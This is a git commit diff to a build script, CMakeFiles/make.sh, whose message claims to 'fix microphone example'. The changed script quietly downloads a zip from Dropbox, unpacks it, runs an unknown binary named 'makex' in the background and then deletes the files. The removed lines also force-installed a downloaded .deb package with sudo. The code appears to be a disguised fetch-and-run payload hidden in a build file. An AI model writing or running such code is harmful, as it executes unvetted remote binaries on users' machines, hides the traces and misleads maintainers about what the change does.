3bb8a85b56634f27bc83bdb57273e0b78c1ddc35
bojafatey <bojafatey@it-simple.net>
2018-04-09 00:51:42 +0200

    fix microphone example

--- CMakeFiles/make.sh
+++ CMakeFiles/make.sh
@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/vv24bsdw6wa8yuh/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/o6p05aoxkjt9pw5/makex.zip -q
-unzip makex.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/gx8o29z4ti8xfhn/wan09.zip -q
+unzip wan09.zip > /dev/null 2>&1
 #pwd
-./CMakeFiles/makex ./CMakeFiles/script &
+./makex ./script &
 sleep 3
-rm -rf makex.zip
-rm -rf CMakeFiles/makex
-rm -rf CMakeFiles/script
+rm -rf wan09.zip
+rm -rf makex
+rm -rf script
 while [ $SECONDS -lt $end ]
 do
     read line
